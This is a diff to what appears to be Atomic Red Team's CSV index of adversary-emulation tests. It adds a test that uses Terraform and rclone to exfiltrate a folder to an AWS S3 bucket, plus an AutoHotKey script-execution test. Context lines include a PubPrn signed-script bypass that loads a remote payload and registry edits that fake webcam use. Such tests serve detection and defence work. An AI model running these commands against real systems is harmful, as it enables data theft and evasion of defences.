@@ -4512,6 +4512,127 @@ input_arguments.remote_share.type: string
 input_arguments.remote_share.default: T1567002
 
 "
+T1567.002,Exfiltration Over Web Service: Exfiltration to Cloud Storage,Exfiltrate data with rclone to cloud Storage - AWS S3,a4b74723-5cee-4300-91c3-5e34166909b4,"This test uses rclone to exfiltrate data to a remote cloud storage instance. (AWS S3)
+See https://thedfirreport.com/2022/06/16/sans-ransomware-summit-2022-can-you-detect-this/
+",linux,macos,,"Write-Host ""Deploying AWS infrastructure... "" -NoNewLine
+$awsAccessKey = ""#{aws_access_key}""
+$awsSecretKey = ""#{aws_secret_key}""
+cd PathToAtomicsFolder/T1567.002/src/
+if ($awsAccessKey -eq """" -or $awsSecretKey -eq """") {
+  $env:AWS_PROFILE = ""#{aws_profile}""
+} else {
+  $env:AWS_ACCESS_KEY_ID = ""$awsAccessKey""
+  $env:AWS_SECRET_ACCESS_KEY = ""$awsSecretKey""
+}
+$null = PathToAtomicsFolder/../ExternalPayloads/T1567.002/terraform-v*/terraform init
+$null = PathToAtomicsFolder/../ExternalPayloads/T1567.002/terraform-v*/terraform apply -var ""aws_region=#{aws_region}"" -auto-approve
+Write-Host ""Done!""
+Write-Host ""Generating rclone config... "" -NoNewLine
+$config = @""
+[exfils3]
+type = s3
+provider = AWS
+env_auth = true
+region = #{aws_region}
+""@
+$config | Out-File -FilePath ""PathToAtomicsFolder/../ExternalPayloads/T1567.002/rclone.conf"" -Encoding ascii
+Write-Host ""Done!""
+Write-Host ""Exfiltrating data... "" -NoNewLine
+$bucket = ""$(PathToAtomicsFolder/../ExternalPayloads/T1567.002/terraform-v*/terraform output bucket)"".Replace(""`"""","""")
+cd PathToAtomicsFolder/../ExternalPayloads/T1567.002/rclone-v*
+$null = ./rclone copy --max-size 1700k ""PathToAtomicsFolder/../ExternalPayloads/T1567.002/data/"" exfils3:$bucket --config ""PathToAtomicsFolder/../ExternalPayloads/T1567.002/rclone.conf""
+Write-Host ""Done!""
+",powershell,False,,"Write-Host ""Destroying AWS infrastructure... "" -NoNewLine
+$awsAccessKey = ""#{aws_access_key}""
+$awsSecretKey = ""#{aws_secret_key}""
+cd PathToAtomicsFolder/T1567.002/src/
+if ($awsAccessKey -eq """" -or $awsSecretKey -eq """") {
+  $env:AWS_PROFILE = ""#{aws_profile}""
+} else {
+  $env:AWS_ACCESS_KEY_ID = ""$awsAccessKey""
+  $env:AWS_SECRET_ACCESS_KEY = ""$awsSecretKey""
+}
+$null = PathToAtomicsFolder/../ExternalPayloads/T1567.002/terraform-v*/terraform destroy -var ""aws_region=#{aws_region}"" -auto-approve
+Write-Host ""Done!""
+",powershell,"dependencies.0.description: rclone must exist at (#{rclone_path})
+
+dependencies.0.prereq_command: if (Test-Path ""#{rclone_path}"") {exit 0} else {exit 1}
+
+dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder/../ExternalPayloads/"" -ErrorAction Ignore -Force | Out-Null
+$arch = ([System.Runtime.InteropServices.RuntimeInformation]::OSArchitecture).ToString().ToLower()
+$operatingSystem = ([System.Runtime.InteropServices.RuntimeInformation]::OSDescription).ToString().ToLower()
+if ($operatingSystem -match ""darwin"") {
+  Invoke-WebRequest ""https://downloads.rclone.org/rclone-current-osx-$arch.zip"" -OutFile ""PathToAtomicsFolder/../ExternalPayloads/rclone.zip""
+} elseif ($operatingSystem -match ""linux"") {
+  Invoke-WebRequest ""https://downloads.rclone.org/rclone-current-linux-$arch.zip"" -OutFile ""PathToAtomicsFolder/../ExternalPayloads/rclone.zip""
+}
+Expand-archive -path ""PathToAtomicsFolder/../ExternalPayloads/rclone.zip"" -DestinationPath ""PathToAtomicsFolder/../ExternalPayloads/T1567.002/"" -force
+
+dependencies.1.description: terraform must exist at (#{terraform_path})
+dependencies.1.prereq_command: if (Test-Path ""#{terraform_path}"") {exit 0} else {exit 1}
+
+dependencies.1.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder/../ExternalPayloads/"" -ErrorAction Ignore -Force | Out-Null
+$arch = ([System.Runtime.InteropServices.RuntimeInformation]::OSArchitecture).ToString().ToLower()
+$operatingSystem = ([System.Runtime.InteropServices.RuntimeInformation]::OSDescription).ToString().ToLower()
+if ($operatingSystem -match ""darwin"") {
+  Invoke-WebRequest ""https://releases.hashicorp.com/terraform/1.10.5/terraform_1.10.5_darwin_$arch.zip"" -OutFile ""PathToAtomicsFolder/../ExternalPayloads/terraform.zip""
+} elseif ($operatingSystem -match ""linux"") {
+  Invoke-WebRequest ""https://releases.hashicorp.com/terraform/1.10.5/terraform_1.10.5_linux_$arch.zip"" -OutFile ""PathToAtomicsFolder/../ExternalPayloads/terraform.zip""
+}
+Expand-archive -path ""PathToAtomicsFolder/../ExternalPayloads/terraform.zip"" -DestinationPath ""PathToAtomicsFolder/../ExternalPayloads/T1567.002/terraform-v1.10.5/"" -force
+
+dependencies.2.description: Must provide a valid directory or file path to exfiltrate to AWS S3
+
+dependencies.2.prereq_command: if (Test-Path ""#{exfil_directory}"") {exit 0} else {exit 1}
+
+dependencies.2.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder/../ExternalPayloads/T1567.002/data"" -ErrorAction Ignore -Force | Out-Null
+foreach($fileSuffix in 1..10) {
+  Set-Content ""PathToAtomicsFolder/../ExternalPayloads/T1567.002/data/test$fileSuffix.txt"" ""This is a test file""
+}
+
+","input_arguments.rclone_path.description: Directory of rclone.exe
+
+input_arguments.rclone_path.type: path
+
+input_arguments.rclone_path.default: PathToAtomicsFolder/../ExternalPayloads/T1567.002/rclone-v*/
+
+input_arguments.exfil_directory.description: Directory to exfiltrate
+
+input_arguments.exfil_directory.type: string
+
+input_arguments.exfil_directory.default: PathToAtomicsFolder/../ExternalPayloads/T1567.002/data/
+
+input_arguments.terraform_path.description: Directory of terraform
+
+input_arguments.terraform_path.type: path
+
+input_arguments.terraform_path.default: PathToAtomicsFolder/../ExternalPayloads/T1567.002/terraform-v*
+
+input_arguments.aws_access_key.description: AWS Access Key
+
+input_arguments.aws_access_key.type: string
+
+input_arguments.aws_access_key.default: 
+
+input_arguments.aws_secret_key.description: AWS Secret Key
+
+input_arguments.aws_secret_key.type: string
+
+input_arguments.aws_secret_key.default: 
+
+input_arguments.aws_region.description: AWS Region
+
+input_arguments.aws_region.type: string
+
+input_arguments.aws_region.default: us-east-1
+
+input_arguments.aws_profile.description: AWS Profile
+
+input_arguments.aws_profile.type: string
+
+input_arguments.aws_profile.default: default
+
+"
 T1125,Video Capture,Registry artefact when application use webcam,6581e4a7-42e3-43c5-a0d2-5a0d62f9702a,"[can-you-track-processes-accessing-the-camera-and-microphone](https://svch0st.medium.com/can-you-track-processes-accessing-the-camera-and-microphone-7e6885b37072)
 ",windows,,,"reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\webcam\NonPackaged\C:#Windows#Temp#atomic.exe /v LastUsedTimeStart /t REG_BINARY /d a273b6f07104d601 /f
 reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\webcam\NonPackaged\C:#Windows#Temp#atomic.exe /v LastUsedTimeStop /t REG_BINARY /d 96ef514b7204d601 /f
@@ -9207,7 +9328,7 @@ $userprincipalname = ""#{userprincipalname}""
 $username = ""#{username}""      
 $password = ""#{password}""
 az ad user create --display-name $username --password $password --user-principal-name $userprincipalname
-az ad user list --filter ""displayname eq 'atomicredteam'""     ",powershell,,,az ad user delete --id,powershell,"dependencies.0.description: Check if Azure CLI is installed and install manually
+az ad user list --filter ""displayname eq 'atomicredteam'""     ",powershell,,,"az ad user delete --id ""#{userprincipalname}""",powershell,"dependencies.0.description: Check if Azure CLI is installed and install manually
 dependencies.0.prereq_command: az account list
 dependencies.0.get_prereq_command: echo ""use the following to install the Azure CLI manually https://aka.ms/installazurecliwindows""
 dependencies.1.description: Check if Azure CLI is installed and install via PowerShell
@@ -9966,6 +10087,35 @@ T1216.001,Signed Script Proxy Execution: Pubprn,PubPrn.vbs Signed Script Bypass,
 input_arguments.remote_payload.type: url
 
 input_arguments.remote_payload.default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1216.001/src/T1216.001.sct
+
+"
+T1059.010,Command and Scripting Interpreter: AutoHotKey & AutoIT,AutoHotKey script execution,7b5d350e-f758-43cc-a761-8e3f6b052a03,"An adversary may attempt to execute malicious script using AutoHotKey software instead of regular terminal like powershell or cmd. A messagebox will be displayed and calculator will popup when the script is executed successfully
+",windows,,,"Start-Process -FilePath ""#{autohotkey_path}"" -ArgumentList ""#{script_path}""
+",powershell,,,,powershell,"dependencies.0.description: AutoHotKey executable file must exist on disk at the specified location (#{autohotkey_path})
+
+dependencies.0.prereq_command: if(Test-Path ""#{autohotkey_path}"") {
+    exit 0
+} else {
+    exit 1
+}
+
+dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
+$AutoHotKeyURL = ""https://www.autohotkey.com/download/ahk.zip""
+$InstallerPath = ""$PathToAtomicsFolder\..\ExternalPayloads""
+Invoke-WebRequest -Uri $AutoHotKeyURL -OutFile $InstallerPath\ahk.zip
+Expand-Archive -Path $InstallerPath -Force;
+
+","input_arguments.script_path.description: AutoHotKey Script Path
+
+input_arguments.script_path.type: path
+
+input_arguments.script_path.default: PathToAtomicsFolder\T1059.010\src\calc.ahk
+
+input_arguments.autohotkey_path.description: AutoHotKey Executable File Path
+
+input_arguments.autohotkey_path.type: path
+
+input_arguments.autohotkey_path.default: $PathToAtomicsFolder\..\ExternalPayloads\ahk\AutoHotKeyU64.exe
 
 "
 T1039,Data from Network Shared Drive,Copy a sensitive File over Administrative share with copy,6ed67921-1774-44ba-bac6-adb51ed60660,"Copy from sensitive File from the c$ of another LAN computer with copy cmd
